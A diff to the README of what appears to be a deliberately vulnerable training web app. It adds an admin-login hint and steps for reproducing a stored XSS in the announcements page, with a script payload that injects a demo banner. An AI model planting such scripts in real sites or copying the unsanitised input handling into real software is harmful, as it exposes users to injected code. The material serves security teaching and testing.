@@ -70,6 +70,7 @@ To run the application:
 ```bash
 python app.py
 ```
+Use the given sign up details given in setup.py to login as admin. 
 
 ### 5. Deactivating the Virtual Environment
 
@@ -79,6 +80,28 @@ When you are done working on the project, deactivate the virtual environment:
 deactivate
 ```
 
+## To test Vulnerabilities:
+
+### Web Vulnerability: Stored XSS in Announcements. 
+
+1. Go to Announcement Page. 
+2. Create an announcement with a script in the body of the announcement
+```
+<script>
+if(!document.getElementById('xss-banner')){
+  var b = document.createElement('div');
+  b.id = 'xss-banner';
+  b.style.cssText = 'position:fixed;left:0;right:0;top:0;padding:10px 12px;background:#e74c3c;color:#fff;font-weight:600;z-index:99999;text-align:center';
+  b.innerHTML = 'XSS DEMO — This page has been XSSed! <button id="xss-close" style="margin-left:8px;padding:2px 8px;border:none;border-radius:4px;cursor:pointer">×</button>';
+  document.documentElement.appendChild(b);
+  document.getElementById('xss-close').onclick = function(){ b.remove(); };
+  setTimeout(function(){ if(b.parentNode) b.remove(); }, 15000);
+}
+</script>
+```
+3. Post the announcement
+4. See the change (a pop up banner message to show it worked)
+5. Now, everytime the page is refreshed, click out and back into the page, the pop up will appear. 
 
 
 
